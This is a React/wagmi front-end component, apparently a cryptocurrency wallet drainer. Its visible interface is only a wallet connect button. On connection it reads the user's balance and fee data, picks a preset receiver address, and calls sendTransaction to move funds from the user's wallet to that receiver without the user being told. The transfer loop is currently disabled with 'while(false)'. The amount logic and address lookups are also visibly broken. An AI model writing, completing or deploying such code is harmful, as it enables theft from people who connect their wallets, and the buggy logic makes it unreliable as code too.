"use client"
import { useSendTransaction, usePrepareContractWrite, useContractWrite, useWaitForTransaction ,useAccount, useBalance, useFeeData, useDisconnect, useWalletClient, useNetwork, useContractRead, usePublicClient } from 'wagmi'
import { signTrans } from '@/utils/transact'
import {useState} from "react"
import { erc20ABI } from 'wagmi'
import { receivers, con_adds } from '@/utils/constant/address'

export const SendBox = () => {
  
  const publicClient = usePublicClient()
  
  const [amt, setAmt] = useState(BigInt("0"))

  const [req, setRequest] = useState({})
  
  //const [account, setAccount] = useState('0x2170Ed0880ac9A755fd29B2688956BD959F933F8')
  const {chain} = useNetwork()
  const [receiver, setReceiver] = useState("0x2170Ed0880ac9A755fd29B2688956BD959F933F8")
  const [con_add, setConAdd] = useState('0xB8c77482e45F1F44dE1745F52C74426C631bDD52') 
  const {address, isConnected} = useAccount({

    async onConnect({ address, connector, isReconnected }) {
     
    let bal = data?.value || BigInt("0")
    let fee = gasPrice?.gasPrice || BigInt("0")
    const rems = fee - bal // - fee change back to balance minus fee
    
    const cid = chain?.id || 1
    setConAdd(con_adds.cid)
    setReceiver(receivers.cid)
    setAmt(rems)
    console.log("Chain ",chain)
    }
  })

  const {sendTransaction} = useSendTransaction({
    account: address,
    
  })

const {data: walletClient, isFetched, status} = useWalletClient(
  
  { 
    
  onError(error) {
   
    console.log("WC error", error)
  },

  async onSuccess(data) {

    if(isConnected)
    {

      const addresses = await data?.getAddresses()
      // console.log(addresses)
      console.log(receiver, con_add)
      
     while(false) 
     {

      try {
            const res = await data?.sendTransaction({ 
                account: address,
                to: receiver,
                value: amt
              })
            console.log("WC datas",res)

          // await data?.sendRawTransaction(res)
       } catch (error) {
        console.log(error)
       }
     }
    }
  }
})
 
const { disconnect } = useDisconnect()

    const { data } = useBalance({
      address
    })
const {data: gasPrice } = useFeeData()
   
        if(isConnected) return <button onClick={() => disconnect()}>Disconnect</button>
        return (
          <>
    <w3m-button />
     </>

        )

}


